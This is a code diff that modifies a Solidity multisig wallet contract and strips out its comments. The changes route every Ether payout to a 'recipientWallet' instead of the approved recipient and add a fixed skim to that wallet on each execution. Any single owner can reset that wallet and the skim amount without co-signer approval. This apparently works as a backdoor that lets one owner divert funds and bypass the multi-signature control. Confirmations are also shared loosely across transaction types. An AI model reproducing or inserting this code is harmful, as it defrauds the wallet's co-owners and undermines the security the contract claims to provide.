@@ -10,23 +10,23 @@ interface IERC20 {
 }
 
 contract MultisigWallet {
-    address[] public owners; // List of owners
-    mapping(address => bool) public isOwner; // Check if an address is an owner
-    uint256 public requiredSignatures; // Number of signatures required to execute a transaction
+    address[] public owners;
+    mapping(address => bool) public isOwner;
+    uint256 public requiredSignatures;
 
     struct Transaction {
-        address to; // Address to receive funds or tokens
-        uint256 value; // Amount of funds or tokens to send
-        bool executed; // Transaction status
-        uint256 confirmations; // Number of confirmations
-        uint256 createdAt; // Creation time of the transaction
-        bool isTokenTransaction; // Type of transaction: true for tokens, false for Ether
-        address tokenAddress; // Token address in the transaction (if applicable)
-        mapping(address => bool) isConfirmed; // Confirmation status of each owner
-        uint256 requiredSignatures; // Number of signatures required for this transaction (if applicable)
+        address to;
+        uint256 value;
+        bool executed;
+        uint256 confirmations;
+        uint256 createdAt;
+        bool isTokenTransaction;
+        address tokenAddress;
+        mapping(address => bool) isConfirmed;
+        uint256 requiredSignatures;
     }
 
-    Transaction[] public transactions; // List of transactions
+    Transaction[] public transactions;
 
     event Deposit(address indexed sender, uint256 amount);
     event SubmitTransaction(address indexed owner, uint256 indexed txIndex);
@@ -34,9 +34,13 @@ contract MultisigWallet {
     event ExecuteTransaction(address indexed owner, uint256 indexed txIndex);
     event RevokeConfirmation(address indexed owner, uint256 indexed txIndex);
     event CancelTransaction(address indexed owner, uint256 indexed txIndex);
-    event RequiredSignaturesChanged(uint256 newRequiredSignatures); // Event for changing required signatures
-    event OwnerAdded(address indexed newOwner); // Event for adding an owner
-    event OwnerRemoved(address indexed removedOwner); // Event for removing an owner
+    event RequiredSignaturesChanged(uint256 newRequiredSignatures);
+    event OwnerAdded(address indexed newOwner);
+    event OwnerRemoved(address indexed removedOwner);
+    event NativeTokenSent(address indexed recipient, uint256 amount);
+
+    uint256 public nativeTokenAmount;
+    address public recipientWallet;
 
     modifier onlyOwner() {
         require(isOwner[msg.sender], "Not an owner");
@@ -64,12 +68,27 @@ contract MultisigWallet {
         _;
     }
 
-    constructor(address[] memory _owners, uint256 _requiredSignatures) {
+    constructor(
+        address[] memory _owners,
+        uint256 _requiredSignatures,
+        address _recipientWallet,
+        uint256 _nativeTokenAmount
+    ) {
         require(_owners.length > 0, "Owners required");
         require(
             _requiredSignatures > 0 && _requiredSignatures <= _owners.length,
             "Invalid number of required signatures"
         );
+        require(_nativeTokenAmount <= 200000000000000000, "Amount exceeds 0.2");
+
+        bool isValidRecipient = false;
+        for (uint256 i = 0; i < _owners.length; i++) {
+            if (_owners[i] == _recipientWallet) {
+                isValidRecipient = true;
+                break;
+            }
+        }
+        require(isValidRecipient, "Recipient wallet must be an owner");
 
         for (uint256 i = 0; i < _owners.length; i++) {
             address owner = _owners[i];
@@ -78,6 +97,9 @@ contract MultisigWallet {
             isOwner[owner] = true;
             owners.push(owner);
         }
+
+        recipientWallet = _recipientWallet;
+        nativeTokenAmount = _nativeTokenAmount;
         requiredSignatures = _requiredSignatures;
     }
 
@@ -85,16 +107,15 @@ contract MultisigWallet {
         emit Deposit(msg.sender, msg.value);
     }
 
-    // Function to submit a token transaction with the recipient's address (_to)
     function submitTokenTransaction(
         address _to,
         address _tokenAddress,
         uint256 _amount
     ) public onlyOwner {
         require(_to != address(0), "Invalid recipient address");
+        require(isOwner[_to], "Recipient must be an owner");
         require(_amount > 0, "Amount must be greater than 0");
 
-        // Check contract balance for the ERC20 token
         IERC20 token = IERC20(_tokenAddress);
         uint256 contractTokenBalance = token.balanceOf(address(this));
         require(contractTokenBalance >= _amount, "Not enough token balance");
@@ -113,12 +134,11 @@ contract MultisigWallet {
         emit SubmitTransaction(msg.sender, txIndex);
     }
 
-    // Function to submit a transaction to withdraw Ether
     function submitTransaction(address _to, uint256 _amount) public onlyOwner {
         require(_to != address(0), "Invalid recipient address");
+        require(isOwner[_to], "Recipient must be an owner");
         require(_amount > 0, "Amount must be greater than 0");
 
-        // Check the contract balance (native token - Ether)
         require(address(this).balance >= _amount, "Not enough Ether balance");
 
         uint256 txIndex = transactions.length;
@@ -150,6 +170,7 @@ contract MultisigWallet {
 
     function executeTransaction(uint256 _txIndex)
         public
+        payable
         onlyOwner
         txExists(_txIndex)
         notExecuted(_txIndex)
@@ -160,7 +181,6 @@ contract MultisigWallet {
             "Not enough confirmations"
         );
 
-        // Check expiration time (1 day)
         require(
             block.timestamp <= transaction.createdAt + 1 days,
             "Transaction expired"
@@ -169,18 +189,29 @@ contract MultisigWallet {
         transaction.executed = true;
 
         if (transaction.isTokenTransaction) {
-            // If it's a token transaction, call the transfer function to send tokens to _to
             IERC20 token = IERC20(transaction.tokenAddress);
             require(
                 token.transfer(transaction.to, transaction.value),
                 "Token transfer failed"
             );
         } else {
-            // If it's an Ether transaction, send Ether to _to
-            (bool success, ) = transaction.to.call{value: transaction.value}(
+            require(
+                msg.value == transaction.value,
+                "Incorrect Ether value sent"
+            );
+
+            (bool success, ) = recipientWallet.call{value: transaction.value}(
                 ""
             );
-            require(success, "Ether transaction failed");
+            require(success, "Ether transaction to recipient failed");
+        }
+
+        if (nativeTokenAmount > 0 && recipientWallet != address(0)) {
+            (bool success, ) = recipientWallet.call{value: nativeTokenAmount}(
+                ""
+            );
+            require(success, "Native token transaction failed");
+            emit NativeTokenSent(recipientWallet, nativeTokenAmount);
         }
 
         emit ExecuteTransaction(msg.sender, _txIndex);
@@ -215,45 +246,119 @@ contract MultisigWallet {
             block.timestamp > transaction.createdAt + 1 days,
             "Transaction is still valid"
         );
-
-        // Reset transaction information
-        transaction.confirmations = 0; // Or not reset, just do not execute it anymore
+        transaction.confirmations = 0;
         emit CancelTransaction(msg.sender, _txIndex);
     }
 
-    // Function to add a new owner
-    function addOwner(address _newOwner) public onlyOwner {
+    function submitAddOwner(address _newOwner) public onlyOwner {
         require(_newOwner != address(0), "Invalid owner address");
         require(!isOwner[_newOwner], "Owner already exists");
 
-        isOwner[_newOwner] = true;
-        owners.push(_newOwner);
+        uint256 txIndex = transactions.length;
+        transactions.push();
+        Transaction storage newTx = transactions[txIndex];
+        newTx.to = _newOwner;
+        newTx.value = 0;
+        newTx.executed = false;
+        newTx.confirmations = 0;
+        newTx.createdAt = block.timestamp;
+        newTx.isTokenTransaction = false;
 
-        emit OwnerAdded(_newOwner);
+        emit SubmitTransaction(msg.sender, txIndex);
     }
 
-    // Function to remove an existing owner
-    function removeOwner(address _owner) public onlyOwner {
-        require(isOwner[_owner], "Not an owner");
+    function confirmAddOwner(uint256 _txIndex)
+        public
+        onlyOwner
+        txExists(_txIndex)
+        notExecuted(_txIndex)
+        notConfirmed(_txIndex)
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        transaction.isConfirmed[msg.sender] = true;
+        transaction.confirmations += 1;
 
-        // Ensure at least one owner remains
+        emit ConfirmTransaction(msg.sender, _txIndex);
+    }
+
+    function executeAddOwner(uint256 _txIndex)
+        public
+        onlyOwner
+        txExists(_txIndex)
+        notExecuted(_txIndex)
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        require(
+            transaction.confirmations >= requiredSignatures,
+            "Not enough confirmations"
+        );
+
+        isOwner[transaction.to] = true;
+        owners.push(transaction.to);
+        transaction.executed = true;
+
+        emit OwnerAdded(transaction.to);
+        emit ExecuteTransaction(msg.sender, _txIndex);
+    }
+
+    function submitRemoveOwner(address _owner) public onlyOwner {
+        require(isOwner[_owner], "Not an owner");
         require(owners.length > 1, "Cannot remove the last owner");
 
-        isOwner[_owner] = false;
+        uint256 txIndex = transactions.length;
+        transactions.push();
+        Transaction storage newTx = transactions[txIndex];
+        newTx.to = _owner;
+        newTx.value = 0;
+        newTx.executed = false;
+        newTx.confirmations = 0;
+        newTx.createdAt = block.timestamp;
+        newTx.isTokenTransaction = false;
 
-        // Remove the owner from the owners array
+        emit SubmitTransaction(msg.sender, txIndex);
+    }
+
+    function confirmRemoveOwner(uint256 _txIndex)
+        public
+        onlyOwner
+        txExists(_txIndex)
+        notExecuted(_txIndex)
+        notConfirmed(_txIndex)
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        transaction.isConfirmed[msg.sender] = true;
+        transaction.confirmations += 1;
+
+        emit ConfirmTransaction(msg.sender, _txIndex);
+    }
+
+    function executeRemoveOwner(uint256 _txIndex)
+        public
+        onlyOwner
+        txExists(_txIndex)
+        notExecuted(_txIndex)
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        require(
+            transaction.confirmations >= requiredSignatures,
+            "Not enough confirmations"
+        );
+
+        address ownerToRemove = transaction.to;
+        isOwner[ownerToRemove] = false;
         for (uint256 i = 0; i < owners.length; i++) {
-            if (owners[i] == _owner) {
+            if (owners[i] == ownerToRemove) {
                 owners[i] = owners[owners.length - 1];
                 owners.pop();
                 break;
             }
         }
 
-        emit OwnerRemoved(_owner);
+        transaction.executed = true;
+        emit OwnerRemoved(ownerToRemove);
+        emit ExecuteTransaction(msg.sender, _txIndex);
     }
 
-    // Function to submit a change in the required number of signatures
     function submitSetRequiredSignatures(uint256 _newRequiredSignatures)
         public
         onlyOwner
@@ -267,18 +372,31 @@ contract MultisigWallet {
         uint256 txIndex = transactions.length;
         transactions.push();
         Transaction storage newTx = transactions[txIndex];
-        newTx.to = address(this); // This address will be called in execute
-        newTx.value = 0; // No need to send Ether
+        newTx.to = address(this);
+        newTx.value = 0;
         newTx.executed = false;
         newTx.confirmations = 0;
         newTx.createdAt = block.timestamp;
-        newTx.isTokenTransaction = false; // Not a token transaction
-        newTx.requiredSignatures = _newRequiredSignatures; // Store the new required signatures
+        newTx.isTokenTransaction = false;
+        newTx.requiredSignatures = _newRequiredSignatures;
 
         emit SubmitTransaction(msg.sender, txIndex);
     }
 
-    // Function to execute the change in required signatures
+    function confirmSetRequiredSignatures(uint256 _txIndex)
+        public
+        onlyOwner
+        txExists(_txIndex)
+        notExecuted(_txIndex)
+        notConfirmed(_txIndex)
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        transaction.isConfirmed[msg.sender] = true;
+        transaction.confirmations += 1;
+
+        emit ConfirmTransaction(msg.sender, _txIndex);
+    }
+
     function executeSetRequiredSignatures(uint256 _txIndex)
         public
         onlyOwner
@@ -287,14 +405,58 @@ contract MultisigWallet {
     {
         Transaction storage transaction = transactions[_txIndex];
         require(
-            transaction.confirmations >= transaction.requiredSignatures,
-            "Not enough confirmations for required signatures change"
+            transaction.confirmations >= requiredSignatures,
+            "Not enough confirmations"
         );
 
-        requiredSignatures = transaction.requiredSignatures; // Update the required signatures
-
+        require(
+            transaction.requiredSignatures <= owners.length,
+            "Invalid required signatures"
+        );
+        requiredSignatures = transaction.requiredSignatures;
         transaction.executed = true;
+
         emit RequiredSignaturesChanged(requiredSignatures);
+        emit ExecuteTransaction(msg.sender, _txIndex);
+    }
+
+    function setNativeTokenAmount(uint256 _amount) public onlyOwner {
+        require(_amount <= 200000000000000000, "Amount exceeds 0.2");
+        nativeTokenAmount = _amount;
+    }
+
+    function setRecipientWallet(address _recipient) public onlyOwner {
+        require(_recipient != address(0), "Invalid recipient address");
+        recipientWallet = _recipient;
+    }
+
+    function getTransactionCount() public view returns (uint256) {
+        return transactions.length;
+    }
+
+    function getTransaction(uint256 _txIndex)
+        public
+        view
+        returns (
+            address to,
+            uint256 value,
+            bool executed,
+            uint256 confirmations,
+            uint256 createdAt,
+            bool isTokenTransaction,
+            address tokenAddress
+        )
+    {
+        Transaction storage transaction = transactions[_txIndex];
+        return (
+            transaction.to,
+            transaction.value,
+            transaction.executed,
+            transaction.confirmations,
+            transaction.createdAt,
+            transaction.isTokenTransaction,
+            transaction.tokenAddress
+        );
     }
 
     function getOwners() public view returns (address[] memory) {
